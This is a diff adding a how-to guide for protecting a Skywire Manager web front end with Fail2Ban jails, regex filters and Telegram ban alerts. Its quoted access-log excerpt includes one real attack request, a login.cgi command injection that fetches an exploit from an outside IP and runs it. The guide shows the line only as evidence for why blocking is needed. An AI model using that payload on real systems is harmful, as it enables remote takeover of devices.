@@ -1,0 +1,326 @@
+#############  Secure Skywire Manager against web bots / scanners with Fail2Ban and get alerts via Telegam ##################
+
+Some of you may have a web server installed on the skywire manager node in order to be able to acces the manager interface via a domain name from internet and preferably in a secure manner with SSL certificates .
+Please be mindful that there are bad guys out there aka "haxors" who run 24/7 all sorts of software for port scanning and vulnerability checks. You can check this by looking into Apache or Nginx access.log file or error.log  file . (For Nginx check  /var/log/nginx/access.log or /var/log/nginx.error.log ).
+
+
+Example of lines from access.log :
+
+Me accessing my server :
+
+53.122.87.160 - skyuser [30/Jun/2018:16:09:47 +0000] "GET /conn/getAll HTTP/1.1" 200 1313 "https://skycluster01.ddns.net/" "Mozilla/5.0 (Android 8.0.0; Mobile; rv:60.0) Gecko/60.0 Firefox/60.0"
+53.122.87.160 - skyuser [30/Jun/2018:16:09:52 +0000] "GET /conn/getAll HTTP/1.1" 200 1313 "https://skycluster01.ddns.net/" "Mozilla/5.0 (Android 8.0.0; Mobile; rv:60.0) Gecko/60.0 Firefox/60.0"
+53.122.87.160 - skyuser [30/Jun/2018:16:09:57 +0000] "GET /conn/getAll HTTP/1.1" 200 1313 "https://skycluster01.ddns.net/" "Mozilla/5.0 (Android 8.0.0; Mobile; rv:60.0) Gecko/60.0 Firefox/60.0"
+53.122.87.160 - skyuser [30/Jun/2018:16:10:02 +0000] "GET /conn/getAll HTTP/1.1" 200 1313 "https://skycluster01.ddns.net/" "Mozilla/5.0 (Android 8.0.0; Mobile; rv:60.0) Gecko/60.0 Firefox/60.0"
+53.122.87.160 - skyuser [30/Jun/2018:16:10:07 +0000] "GET /conn/getAll HTTP/1.1" 200 1312 "https://skycluster01.ddns.net/" "Mozilla/5.0 (Android 8.0.0; Mobile; rv:60.0) Gecko/60.0 Firefox/60.0"
+53.122.87.160 - skyuser [30/Jun/2018:16:10:12 +0000] "GET /conn/getAll HTTP/1.1" 200 1312 "https://skycluster01.ddns.net/" "Mozilla/5.0 (Android 8.0.0; Mobile; rv:60.0) Gecko/60.0 Firefox/60.0"
+
+Haxors trying to access my server :
+
+189.113.110.19 - - [30/Jun/2018:16:11:51 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
+221.206.153.16 - - [30/Jun/2018:16:36:03 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://185.158.114.160/exploit/mips.exploit%20-O%20-%3E%20/tmp/mips.exploit;sh%20/tmp/mips.exploit%27$ HTTP/1.1" 400 0 "-" "-"
+213.6.13.2 - - [30/Jun/2018:16:58:21 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
+194.154.68.90 - - [30/Jun/2018:17:02:30 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
+103.14.250.219 - - [30/Jun/2018:17:24:01 +0000] "GET / HTTP/1.0" 200 612 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
+5.42.62.229 - - [30/Jun/2018:17:28:53 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
+168.181.244.50 - - [30/Jun/2018:17:47:53 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
+200.116.198.161 - - [30/Jun/2018:17:54:02 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
+201.95.86.25 - - [30/Jun/2018:18:12:37 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
+201.95.86.25 - - [30/Jun/2018:18:12:37 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
+219.141.87.48 - admin [30/Jun/2018:18:55:58 +0000] "GET /web/cgi-bin/hi3510/param.cgi?cmd=getp2pattr&cmd=getuserattr HTTP/1.1" 404 571 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)"
+85.105.251.192 - - [30/Jun/2018:19:18:27 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
+
+To add some extra protection to our nodes it is recommended to install Fail2Ban and configure some filters that will ban the malicious IPs .
+
+The below guide is for Debian based OSs with Nginx web server installed. If you use other web server , please modify the path to the logs accordingly ( logpath = /var/log/nginx*/*access*.log ).
+
+### Step 1
+
+SSH into the node that runs skywire manager and the web server 
+
+### Step 2
+Install fail2ban, telegram-send and some dependencies.
+
+Run the following commands :
+
+apt update && apt install --yes --force-yes fail2ban python-pip python-setuptools python3-setuptools
+
+pip install wheel
+
+pip install telegram-send
+
+### Step 3
+Run the following commands :
+
+cd /etc/fail2ban/
+
+rm jail.d/defaults-debian.conf 
+
+### Step 4 
+
+Use a tex editor to create a new configuration file under /etc/fail2ban/jail.local . I used  VIM because this is my favourite.  
+
+vim /etc/fail2ban/jail.local
+
+Now you are in VIM editor. In order to insert text press "i"
+Now you are in "INSERT" mode. Copy the text below and paste it in the jail.local file . To paste inside the file just click on the console window then press "SHIFT+Insert".
+To save the file press "ESC" ( to exit INSERT mode ) then press ":" then "wq" then "ENTER" 
+###############################################################################################
+[INCLUDES]
+#before = paths-distro.conf
+before = paths-debian.conf
+
+[DEFAULT]
+
+# "ignoreip" can be an IP address, a CIDR mask or a DNS host. Fail2ban will not
+# ban a host which matches an address in this list. Several addresses can be
+# defined using space (and/or comma) separator.
+ignoreip = 127.0.0.1/8
+# External command that will take an tagged arguments to ignore, e.g. <ip>,
+# and return true if the IP is to be ignored. False otherwise.
+# ignorecommand = /path/to/command <ip>
+ignorecommand =
+bantime  = 7200
+findtime  = 7200
+maxretry = 3
+backend = auto
+usedns = warn
+logencoding = auto
+
+# "enabled" enables the jails.
+#  By default all jails are disabled, and it should stay this way.
+#  Enable only relevant to your setup jails in your .local or jail.d/*.conf
+enabled = false
+
+# "filter" defines the filter to use by the jail.
+#  By default jails have names matching their filter name
+filter = %(__name__)s
+
+# ACTIONS
+
+# Default protocol
+protocol = tcp
+
+# Specify chain where jumps would need to be added in iptables-* actions
+chain = INPUT
+
+# Ports to be banned
+# Usually should be overridden in a particular jail
+port = 0:65535
+
+# Format of user-agent https://tools.ietf.org/html/rfc7231#section-5.5.3
+fail2ban_agent = Fail2Ban/%(fail2ban_version)s
+
+# Action shortcuts. To be used to define action parameter
+banaction = iptables-multiport
+banaction_allports = iptables-allports
+# The simplest action to take: ban only
+action_ = %(banaction)s[name=%(__name__)s, bantime="%(bantime)s", port="%(port)s", protocol="%(protocol)s", chain="%(chain)s"]
+action_mw = %(banaction)s[name=%(__name__)s, bantime="%(bantime)s", port="%(port)s", protocol="%(protocol)s", chain="%(chain)s"]
+            %(mta)s-whois[name=%(__name__)s, sender="%(sender)s", dest="%(destemail)s", protocol="%(protocol)s", chain="%(chain)s"]
+action_mwl = %(banaction)s[name=%(__name__)s, bantime="%(bantime)s", port="%(port)s", protocol="%(protocol)s", chain="%(chain)s"]
+             %(mta)s-whois-lines[name=%(__name__)s, sender="%(sender)s", dest="%(destemail)s", logpath=%(logpath)s, chain="%(chain)s"]
+action_xarf = %(banaction)s[name=%(__name__)s, bantime="%(bantime)s", port="%(port)s", protocol="%(protocol)s", chain="%(chain)s"]
+             xarf-login-attack[service=%(__name__)s, sender="%(sender)s", logpath=%(logpath)s, port="%(port)s"]
+action_cf_mwl = cloudflare[cfuser="%(cfemail)s", cftoken="%(cfapikey)s"]
+                %(mta)s-whois-lines[name=%(__name__)s, sender="%(sender)s", dest="%(destemail)s", logpath=%(logpath)s, chain="%(chain)s"]
+action_blocklist_de  = blocklist_de[email="%(sender)s", service=%(filter)s, apikey="%(blocklist_de_apikey)s", agent="%(fail2ban_agent)s"]
+action_badips = badips.py[category="%(__name__)s", banaction="%(banaction)s", agent="%(fail2ban_agent)s"]
+action_badips_report = badips[category="%(__name__)s", agent="%(fail2ban_agent)s"]
+action = %(action_)s
+
+# JAILS
+
+# SSH servers
+
+[sshd]
+
+enabled = true
+port    = ssh
+logpath = %(sshd_log)s
+backend = %(sshd_backend)s
+
+
+[sshd-ddos]
+# This jail corresponds to the standard configuration in Fail2ban.
+enabled = true
+port    = ssh
+logpath = %(sshd_log)s
+backend = %(sshd_backend)s
+
+# HTTP servers
+
+[nginx-auth]
+enabled = true
+filter = nginx-auth
+action = iptables-multiport[name=NoAuthFailures, port="http,https"]
+         telegram[name=NGINX-AUTH]
+logpath = /var/log/nginx*/*error*.log
+bantime = 9600 
+maxretry = 3
+
+[nginx-login]
+enabled = true
+filter = nginx-login
+action = iptables-multiport[name=NoLoginFailures, port="http,https"]
+         telegram[name=NGINX-LOGIN]
+logpath = /var/log/nginx*/*access*.log
+bantime = 9600
+maxretry = 3
+ 
+[nginx-badbots]
+enabled  = true
+filter = apache-badbots
+action = iptables-multiport[name=BadBots, port="http,https"]
+         telegram[name=NGINX-BADBOTS]
+logpath = /var/log/nginx*/*access*.log
+bantime = 86400
+maxretry = 1
+ 
+[nginx-noscript]
+enabled = true
+action = iptables-multiport[name=NoScript, port="http,https"]
+         telegram[name=NGINX-NOSCRIPT]
+filter = nginx-noscript
+logpath = /var/log/nginx*/*access*.log
+maxretry = 3
+bantime  = 86400
+ 
+[nginx-proxy]
+enabled = true
+action = iptables-multiport[name=NoProxy, port="http,https"]
+         telegram[name=NGINX-PROXY]
+filter = nginx-proxy
+logpath = /var/log/nginx*/*access*.log
+maxretry = 0
+bantime  = 86400
+
+###############################################################################################
+
+
+### Step 5
+
+Create filters for different types of attacks :
+
+Filter 1 :
+
+vim /etc/fail2ban/filter.d/nginx-proxy.conf
+
+Similar with the step before , add the follwing text into nginx-proxy.conf file and save it:
+
+###############################################################################################
+# Proxy filter /etc/fail2ban/filter.d/nginx-proxy.conf:
+#
+# Block IPs trying to use server as proxy.
+#
+# Matches e.g.
+# 192.168.1.1 - - "GET http://www.something.com/
+#
+[Definition]
+failregex = ^<HOST> -.*GET http.*
+ignoreregex =
+###############################################################################################
+
+Filter 2 :
+
+vim /etc/fail2ban/filter.d/nginx-noscript.conf
+
+###############################################################################################
+# Noscript filter /etc/fail2ban/filter.d/nginx-noscript.conf:
+#
+# Block IPs trying to execute scripts such as .php, .pl, .exe and other funny scripts.
+#
+# Matches e.g.
+# 192.168.1.1 - - "GET /something.php
+#
+[Definition]
+failregex = ^<HOST> -.*GET.*(\.php|\.asp|\.exe|\.pl|\.cgi|\scgi)
+ignoreregex =
+###############################################################################################
+
+Filter 3 :
+
+vim /etc/fail2ban/filter.d/nginx-auth.conf
+
+###############################################################################################
+# Auth filter /etc/fail2ban/filter.d/nginx-auth.conf:
+#
+# Blocks IPs that fail to authenticate using basic authentication
+#
+[Definition]
+ 
+failregex = no user/password was provided for basic authentication.*client: <HOST>
+            user .* was not found in.*client: <HOST>
+            user .* password mismatch.*client: <HOST>
+ 
+ignoreregex =
+###############################################################################################
+
+Filter 4 :
+
+vim /etc/fail2ban/filter.d/nginx-login.conf
+
+###############################################################################################
+# Login filter /etc/fail2ban/filter.d/nginx-login.conf:
+#
+# Blocks IPs that fail to authenticate using web application's log in page
+#
+# Scan access log for HTTP 200 + POST /sessions => failed log in
+[Definition]
+failregex = ^<HOST> -.*POST /sessions HTTP/1\.." 200
+ignoreregex =
+###############################################################################################
+
+
+### Step 6 
+
+Let's create a config file for telegram-send:
+
+vim /etc/fail2ban/action.d/telegram.conf
+
+Add the lines below into the file and save it :
+
+###############################################################################################
+# File /etc/fail2ban/action.d/telegram.conf
+[Definition]
+actionstart = /usr/local/bin/telegram-send --format markdown "[Fail2Ban] The jail <name> has been started on `uname -n` successfully."
+actionstop = /usr/local/bin/telegram-send --format markdown "[Fail2Ban] The jail <name> has been stopped on `uname -n`."
+actioncheck =
+actionban = /usr/local/bin/telegram-send --format markdown "[Fail2Ban] The IP <ip> has just been banned by Fail2Ban after <failures> attempts against <name> from `uname -n`"
+actionunban = /usr/local/bin/telegram-send --format markdown "[Fail2Ban] The IP <ip> has just been unbanned by Fail2Ban after <failures> attempts against <name> from `uname -n`"
+
+[Init]
+init = 'Fail2Ban Telegram plugins activated"
+
+###############################################################################################
+
+### Step 7 
+
+Create a new Telegram bot using BotFather . Just add BotFather on your telegram account and follow the simple guide provided. 
+After successful creation, you should get an API token like this :
+
+584193528:AAHfmQcVAho0YHzbJqIpSg-uzG1SAl6lX1I  ( this is just an example , not my API token , not a valid token )
+
+Write down this token and keep it in a safe place. You will use it to access and manage your bot.
+
+### Step 8
+
+Add the API key of your bot to telegram-send :
+Run the below command :
+
+telegram-send --configure
+
+Paste the token , press "ENTER" and you will be given a temporary code which you will have to send it to your bot ( just open a chat window with your bot , put the code in a message and send it ).
+
+If the previous operation was successful you should receive a green message in the console, from telegram-send, informing you that the telegram-send and your bot are now connected.
+
+### Step 9
+
+Restart fail2ban and enjoy your new cool setup !
+Run this command :
+
+systemctl restart fail2ban.service
+
+After few seconds you should receive messages from bot about different actions.
+I hope this is clear and helpful . There is room for improvement, especially concerning the alerts format.
+If you have questions please shoot and i will try to answer .
